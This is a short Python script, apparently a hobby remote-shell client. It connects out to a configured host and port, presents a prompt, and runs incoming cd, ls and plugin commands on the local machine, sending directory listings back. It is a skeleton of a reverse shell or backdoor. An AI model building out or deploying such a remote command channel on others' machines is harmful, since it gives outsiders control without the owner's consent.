import ModuleLoader
import Connection
import sys
import os


directory = os.path.abspath(os.path.dirname(sys.argv[0]))
plugins =            ModuleLoader.getModules()
running =                                False
host, port =                 'localhost', 8080
connection = Connection.Connection(host, port)


def __init__():
    while not connection.connect():
        pass
    connection.writeln('[ * ] Now Connected [ * ]\n')
    global running
    running = True


def run():
    global directory
    connection.write(directory+'$~ ')
    parse(connection.read(1024))




def parse(cmd):
    cmd, *args = cmd.split(' ')
    # print('cmd:' + cmd)
    # print('args:' + str(args))

    for plugin in plugins:
        if cmd.lower() == plugin['name'].lower():
            ModuleLoader.loadModule(plugin)

    for case in switch(cmd):

        if case('cd'):

            if len(args) < 1:

                connection.writeln('Usage: cd <directory>')
                continue

            try:

                os.chdir(args[0])
                global directory
                directory = os.getcwd()
                connection.writeln('current directory: '+ directory)

            except NotADirectoryError:

                connection.writeln('Error: not a directory')

            except FileNotFoundError:

                connection.writeln('Error: could not find directory')
            break


        if case('ls') or case('dir'):

            if len(args) > 0:
                try:
                    files = os.listdir(directory+'/'+args[0])

                    for file in files:

                        if os.path.isdir(directory+'/'+args[0]+'/'+file):
                            connection.writeln('<DIR> ' + file)

                        else:
                            connection.writeln('      ' + file)
                except NotADirectoryError:

                    connection.writeln('Error: not a directory')

                except FileNotFoundError:

                    connection.writeln('Error: could not find directory')

            else:
                files = os.listdir(directory)

                for file in files:

                    if os.path.isdir(directory+'/'+file):
                        connection.writeln('<DIR> ' + file)

                    else:
                        connection.writeln('      ' + file)
            break

        if case('del'):

            if len(args) < 1:
                connection.writeln('Usage: del [r] <file>')

            break

        if case('rename'):
            break

        if case():
            connection.writeln('dunno what happened m8, just don\'t understand you anymore')
            break






class switch(object):

    def __init__(self, value):
        self.value = value
        self.fall = False

    def __iter__(self):
        """Return the match method once, then stop"""

        yield self.match
        raise StopIteration

    def match(self, *args):
        """Indicate whether or not to enter a case suite"""

        if self.fall or not args:
            return True
        elif self.value in args:
            self.fall = True
            return True
        else:
            return False


__init__()
while running:
    print('running')
    run()
